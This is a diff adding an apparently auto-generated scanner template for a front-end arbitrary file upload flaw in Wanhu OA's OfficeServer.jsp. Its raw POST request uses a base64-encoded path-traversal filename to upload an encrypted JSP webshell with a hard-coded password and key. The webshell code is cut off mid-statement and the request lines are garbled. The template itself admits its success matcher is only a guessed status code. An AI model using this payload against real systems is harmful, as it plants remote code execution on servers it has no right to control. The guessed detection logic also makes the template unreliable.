@@ -1,0 +1,61 @@
+id: poc-475591205
+info:
+  name: 万户 OA OfficeServer.jsp 前台任意文件上传漏洞_km0awcsw3z611y1u
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+
+
+
+
+    ``POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    Accept-Encoding: gzip
+
+
+    Content-Length: 2824
+
+
+
+
+    DBSTEP V3.0     145             0               2615            DBSTEP=REJTVEVQ
+
+
+    OPTION=U0FWRUZJTEU=
+
+
+    RECORDID=
+
+
+    isDoc=dHJ1ZQ==
+
+
+    moduleType=Z292ZG9jdW1lbnQ=
+
+
+    FILETYPE=Ly8uLi8uLi9wdWJsaWMvZWRpdC9xYXp3c3guanNw
+
+
+    <%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;tr'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
